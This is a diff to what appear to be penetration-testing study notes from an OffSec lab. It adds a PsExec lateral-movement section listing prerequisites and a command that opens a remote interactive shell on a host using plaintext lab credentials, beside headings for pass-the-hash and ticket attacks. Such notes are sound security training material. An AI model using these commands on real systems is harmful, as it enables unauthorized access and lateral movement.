@@ -2615,6 +2615,15 @@ HUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"`
   - To interact with the session  
     `PS C:\Users\jeff> Enter-PSSession 1`
 - PsExec
+  - 3 requisite:  member of admin local group; ADMIN$ share; File and Printer Sharing  
+  - Need to transfer PsExec too compromised machine (SysInternals suite)  
+  - Login to client74 as 'offsec' user  
+  - obtain an interactive shell on the target system with PsExec  
+    ```
+    PS C:\Tools\SysinternalsSuite> .\PsExec64.exe -i  \\FILES04 -u corp\jen -p Nexus123! cmd
+    C:\Windows\system32>hostname
+    C:\Windows\system32>whoami
+    ```
 - Pass the Hash
 - Overpass the Hash
 - Pass the Ticket
